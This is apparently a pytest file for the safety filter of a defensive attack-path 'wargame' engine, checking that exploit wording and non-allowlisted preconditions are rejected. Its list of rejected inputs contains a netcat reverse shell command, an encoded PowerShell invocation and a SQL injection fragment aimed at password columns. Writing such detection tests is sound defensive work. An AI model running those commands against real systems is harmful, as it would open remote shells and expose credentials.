"""Tests for the Wargame safety guard.

These assert the two invariants that keep a defensive attacker defensive:
no exploit narrative text, and no replica check outside the safe
allowlist.
"""
from __future__ import annotations

import pytest

from app.engine.wargame.model import Precondition, PreconditionKind
from app.engine.wargame import safety
from app.engine.wargame.safety import (
    UnsafeWargameAction,
    assert_precondition_allowed,
    assert_preconditions_allowed,
    assert_safe_text,
    contains_unsafe_token,
    safe_text,
)


# -- narrative filter --------------------------------------------------------

@pytest.mark.parametrize(
    "text",
    [
        "deliver the exploit payload to the host",
        "spawn a reverse shell",
        "run msfvenom",
        "' UNION SELECT password FROM users",
        "powershell -enc aGVsbG8=",
        "nc -e /bin/sh 10.0.0.1 4444",
    ],
)
def test_unsafe_text_is_rejected(text):
    assert contains_unsafe_token(text) is True
    with pytest.raises(UnsafeWargameAction):
        assert_safe_text(text)
    assert safe_text(text, "FALLBACK") == "FALLBACK"


@pytest.mark.parametrize(
    "text",
    [
        "An attacker on the guest network can reach the payment database.",
        "Close the firewall rule permitting 5432 from the guest VLAN.",
        "No route from guest wifi to cardholder data on tcp/5432.",
        "",
    ],
)
def test_impact_text_is_allowed(text):
    assert contains_unsafe_token(text) is False
    assert_safe_text(text)  # no raise
    assert safe_text(text, "FALLBACK") == text


def test_local_reject_tokens_cover_attackpath_list():
    # The guard keeps its own copy of the reject tokens so it carries no DB
    # dependency; this asserts the copy stays a superset of the attack-path
    # engine's, so the two can never silently drift apart.
    from app.engine import attackpath

    assert set(attackpath._REJECT_TOKENS) <= set(safety._REJECT_TOKENS)


# -- precondition allowlist --------------------------------------------------

def test_every_precondition_kind_is_allowlisted():
    # A new PreconditionKind must be consciously added to the allowlist;
    # until then it is refused. Today all of them are allowed.
    for kind in PreconditionKind:
        assert_precondition_allowed(Precondition(kind, f"check {kind.value}"))


def test_precondition_with_unsafe_description_is_rejected():
    pre = Precondition(
        PreconditionKind.FILE_PRESENT, "drop a reverse shell payload here"
    )
    with pytest.raises(UnsafeWargameAction):
        assert_precondition_allowed(pre)


def test_precondition_with_bogus_kind_is_rejected():
    # Something that isn't a PreconditionKind at all (e.g. a raw string a
    # caller tried to smuggle in) must be refused, not coerced.
    bogus = Precondition.__new__(Precondition)
    object.__setattr__(bogus, "kind", "run_exploit")
    object.__setattr__(bogus, "description", "x")
    object.__setattr__(bogus, "spec", {})
    with pytest.raises(UnsafeWargameAction):
        assert_precondition_allowed(bogus)


def test_assert_preconditions_allowed_batches():
    good = [
        Precondition(PreconditionKind.VERSION_IN_RANGE, "openssl in range"),
        Precondition(PreconditionKind.ENDPOINT_EXPOSED, "5432 listening"),
    ]
    assert_preconditions_allowed(good)  # no raise
    bad = good + [Precondition(PreconditionKind.FILE_PRESENT, "exploit payload")]
    with pytest.raises(UnsafeWargameAction):
        assert_preconditions_allowed(bad)
